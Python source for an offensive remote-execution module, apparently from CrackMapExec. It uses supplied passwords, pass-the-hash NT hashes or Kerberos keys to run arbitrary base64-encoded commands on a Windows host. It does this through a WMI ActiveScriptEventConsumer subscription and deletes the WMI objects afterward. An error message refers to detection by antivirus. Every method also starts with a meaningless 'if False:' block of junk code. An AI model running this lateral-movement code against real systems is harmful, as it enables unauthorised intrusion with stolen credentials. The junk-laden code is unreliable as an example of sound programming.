import time
import uuid
import base64
import sys
from io import StringIO
from cme.helpers.powershell import get_ps_script
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import WBEMSTATUS
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, WBEM_FLAG_FORWARD_ONLY, IWbemLevel1Login, WBEMSTATUS

class WMIEXEC_EVENT:

    def __init__(self, host, username, password, domain, lmhash, nthash, doKerberos, kdcHost, aesKey, logger, interval_time, codec):
        if False:
            print('Hello World!')
        self.__host = host
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = lmhash
        self.__nthash = nthash
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__aesKey = aesKey
        self.__outputBuffer = ''
        self.__retOutput = True
        self.logger = logger
        self.__interval_time = interval_time
        self.__codec = codec
        self.__instanceID = f'windows-object-{str(uuid.uuid4())}'
        self.__instanceID_StoreResult = f'windows-object-{str(uuid.uuid4())}'
        self.__dcom = DCOMConnection(self.__host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost, aesKey=self.__aesKey)
        iInterface = self.__dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        self.__iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
        iWbemLevel1Login.RemRelease()

    def execute(self, command, output=False):
        if False:
            return 10
        if "'" in command:
            command = command.replace("'", '"')
        self.__retOutput = output
        self.execute_handler(command)
        self.__dcom.disconnect()
        return self.__outputBuffer

    def execute_remote(self, command):
        if False:
            for i in range(10):
                print('nop')
        self.logger.info(f'Executing command: {command}')
        try:
            self.execute_vbs(self.process_vbs(command))
        except Exception as e:
            self.logger.error(str(e))

    def execute_handler(self, command):
        if False:
            i = 10
            return i + 15
        self.logger.debug(f'{self.__host}: Execute command via wmi event, job instance id: {self.__instanceID}, command result instance id: {self.__instanceID_StoreResult}')
        self.execute_remote(command)
        self.logger.info('Waiting {}s for command completely executed.'.format(self.__interval_time))
        time.sleep(self.__interval_time)
        if self.__retOutput:
            self.get_CommandResult()
        self.remove_Instance()

    def process_vbs(self, command):
        if False:
            return 10
        schedule_taskname = str(uuid.uuid4())
        if self.__retOutput:
            output_file = f'{str(uuid.uuid4())}.txt'
            with open(get_ps_script('wmiexec_event_vbscripts/Exec_Command_WithOutput.vbs'), 'r') as vbs_file:
                vbs = vbs_file.read()
            vbs = vbs.replace('REPLACE_ME_BASE64_COMMAND', base64.b64encode(command.encode()).decode())
            vbs = vbs.replace('REPLACE_ME_OUTPUT_FILE', output_file)
            vbs = vbs.replace('REPLACE_ME_INSTANCEID', self.__instanceID_StoreResult)
            vbs = vbs.replace('REPLACE_ME_TEMP_TASKNAME', schedule_taskname)
        else:
            with open(get_ps_script('wmiexec_event_vbscripts/Exec_Command_Silent.vbs'), 'r') as vbs_file:
                vbs = vbs_file.read()
            vbs = vbs.replace('REPLACE_ME_BASE64_COMMAND', base64.b64encode(command.encode()).decode())
            vbs = vbs.replace('REPLACE_ME_TEMP_TASKNAME', schedule_taskname)
        return vbs

    def checkError(self, banner, call_status):
        if False:
            while True:
                i = 10
        if call_status != 0:
            try:
                error_name = WBEMSTATUS.enumItems(call_status).name
            except ValueError:
                error_name = 'Unknown'
            self.logger.debug('{} - ERROR: {} (0x{:08x})'.format(banner, error_name, call_status))
        else:
            self.logger.debug(f'{banner} - OK')

    def execute_vbs(self, vbs_content):
        if False:
            while True:
                i = 10
        (activeScript, _) = self.__iWbemServices.GetObject('ActiveScriptEventConsumer')
        activeScript = activeScript.SpawnInstance()
        activeScript.Name = self.__instanceID
        activeScript.ScriptingEngine = 'VBScript'
        activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        activeScript.ScriptText = vbs_content
        current = sys.stdout
        sys.stdout = StringIO()
        resp = self.__iWbemServices.PutInstance(activeScript.marshalMe())
        sys.stdout = current
        self.checkError(f'Adding ActiveScriptEventConsumer.Name="{self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        (wmiTimer, _) = self.__iWbemServices.GetObject('__IntervalTimerInstruction')
        wmiTimer = wmiTimer.SpawnInstance()
        wmiTimer.TimerId = self.__instanceID
        wmiTimer.IntervalBetweenEvents = 1000
        current = sys.stdout
        sys.stdout = StringIO()
        resp = self.__iWbemServices.PutInstance(wmiTimer.marshalMe())
        sys.stdout = current
        self.checkError(f'Adding IntervalTimerInstruction.TimerId="{self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        (eventFilter, _) = self.__iWbemServices.GetObject('__EventFilter')
        eventFilter = eventFilter.SpawnInstance()
        eventFilter.Name = self.__instanceID
        eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        eventFilter.Query = f'select * from __TimerEvent where TimerID = "{self.__instanceID}" '
        eventFilter.QueryLanguage = 'WQL'
        eventFilter.EventNamespace = 'root\\subscription'
        current = sys.stdout
        sys.stdout = StringIO()
        resp = self.__iWbemServices.PutInstance(eventFilter.marshalMe())
        sys.stdout = current
        self.checkError(f'Adding EventFilter.Name={self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        (filterBinding, _) = self.__iWbemServices.GetObject('__FilterToConsumerBinding')
        filterBinding = filterBinding.SpawnInstance()
        filterBinding.Filter = f'__EventFilter.Name="{self.__instanceID}"'
        filterBinding.Consumer = f'ActiveScriptEventConsumer.Name="{self.__instanceID}"'
        filterBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        current = sys.stdout
        sys.stdout = StringIO()
        resp = self.__iWbemServices.PutInstance(filterBinding.marshalMe())
        sys.stdout = current
        self.checkError(f'Adding FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\\"{self.__instanceID}\\"", Filter="__EventFilter.Name=\\"{self.__instanceID}\\""', resp.GetCallStatus(0) & 4294967295)

    def get_CommandResult(self):
        if False:
            i = 10
            return i + 15
        try:
            (command_ResultObject, _) = self.__iWbemServices.GetObject(f'ActiveScriptEventConsumer.Name="{self.__instanceID_StoreResult}"')
            record = dict(command_ResultObject.getProperties())
            self.__outputBuffer = base64.b64decode(record['ScriptText']['value']).decode(self.__codec, errors='replace')
        except Exception as e:
            self.logger.fail(f"""WMIEXEC-EVENT: Get output file error, maybe command not executed successfully or got detected by AV software, please increase the interval time of command execution with "--interval-time" option. If it's still failing maybe something is blocking the schedule job in vbscript, try another exec method""")

    def remove_Instance(self):
        if False:
            return 10
        if self.__retOutput:
            resp = self.__iWbemServices.DeleteInstance(f'ActiveScriptEventConsumer.Name="{self.__instanceID_StoreResult}"')
            self.checkError(f'Removing ActiveScriptEventConsumer.Name="{self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        resp = self.__iWbemServices.DeleteInstance(f'ActiveScriptEventConsumer.Name="{self.__instanceID}"')
        self.checkError(f'Removing ActiveScriptEventConsumer.Name="{self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        resp = self.__iWbemServices.DeleteInstance(f'__IntervalTimerInstruction.TimerId="{self.__instanceID}"')
        self.checkError(f'Removing IntervalTimerInstruction.TimerId="{self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        resp = self.__iWbemServices.DeleteInstance(f'__EventFilter.Name="{self.__instanceID}"')
        self.checkError(f'Removing EventFilter.Name="{self.__instanceID}"', resp.GetCallStatus(0) & 4294967295)
        resp = self.__iWbemServices.DeleteInstance(f'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\\"{self.__instanceID}\\"",Filter="__EventFilter.Name=\\"{self.__instanceID}\\""')
        self.checkError(f'Removing FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\\"{self.__instanceID}\\"", Filter="__EventFilter.Name=\\"{self.__instanceID}\\""', resp.GetCallStatus(0) & 4294967295)